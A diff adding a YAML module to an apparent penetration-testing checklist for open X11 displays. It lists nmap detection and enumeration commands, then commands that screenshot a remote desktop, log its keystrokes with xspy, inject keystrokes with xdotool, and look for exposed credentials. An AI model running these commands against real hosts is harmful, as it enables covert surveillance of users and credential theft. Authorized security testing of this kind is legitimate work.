@@ -1,0 +1,56 @@
+module: x11
+name: X11 (6000-6009)
+inputs: [OUT]
+
+sections:
+
+  - id: initial
+    name: Initial Access & Detection
+    steps:
+      - id: version
+        text: Confirm live / X server
+        commands: |
+          nmap -p$PORT -sV -sC $IP
+      - id: open_access
+        text: Check for open access (no xauth / xhost +)
+        commands: |
+          nmap -p$PORT --script=x11-access $IP
+          xdpyinfo -display $IP:0
+
+  - id: enum
+    name: Enumeration
+    steps:
+      - id: windows
+        text: List windows on the display
+        commands: |
+          xwininfo -root -tree -display $IP:0
+          xlsclients -display $IP:0
+      - id: display_info
+        text: Display capabilities / extensions
+        commands: |
+          xdpyinfo -display $IP:0
+
+  - id: exploit
+    name: Screen Capture & Keylogging
+    authorized: true
+    steps:
+      - id: screenshot
+        text: Grab a screenshot of the live desktop
+        commands: |
+          xwd -root -display $IP:0 -out $OUT/screen.xwd
+          convert $OUT/screen.xwd $OUT/screen.png
+          import -display $IP:0 -window root $OUT/screen.png
+      - id: keylog
+        text: Log keystrokes from the open display
+        commands: |
+          xspy $IP:0
+      - id: inject
+        text: Inject keystrokes / interact with the session
+        manual: true
+        commands: |
+          # xdotool --display $IP:0 key ...   /   type "..."
+      - id: notes
+        text: Note what the desktop exposes (terminals, password managers)
+        manual: true
+        commands: |
+          # open apps often reveal creds, SSH sessions, sensitive docs
